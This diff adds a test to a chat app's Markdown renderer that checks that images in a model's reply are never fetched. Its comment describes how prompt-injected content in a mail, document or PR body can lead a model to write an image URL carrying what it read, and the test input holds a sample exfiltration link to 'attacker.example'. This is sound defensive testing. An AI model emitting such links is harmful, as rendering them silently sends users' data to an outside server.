@@ -26,4 +26,23 @@ describe("MD", () => {
     );
     expect(container.querySelector("table")).toBeNull();
   });
+
+  /**
+   * The one thing a reply must not be able to do on its own.
+   *
+   * A model that has just read a mail, a document or a PR body can be talked
+   * into writing an image whose URL carries what it read. Drawn, that is a
+   * request to a stranger's server the moment the bubble renders — no tap, no
+   * warning, and WireGuard does not stop the browser reaching out.
+   */
+  it("never fetches an image a reply asked for", () => {
+    const { container } = render(
+      <Markdown components={MD} remarkPlugins={REMARK}>
+        {"![receipt](https://attacker.example/?d=secret)\n\n![](/api/assistant/uploads/a.png)"}
+      </Markdown>,
+    );
+    expect(container.querySelectorAll("img")).toHaveLength(0);
+    // Not silently: the alt text is what the reader sees instead.
+    expect(screen.getByText("receipt")).toBeTruthy();
+  });
 });
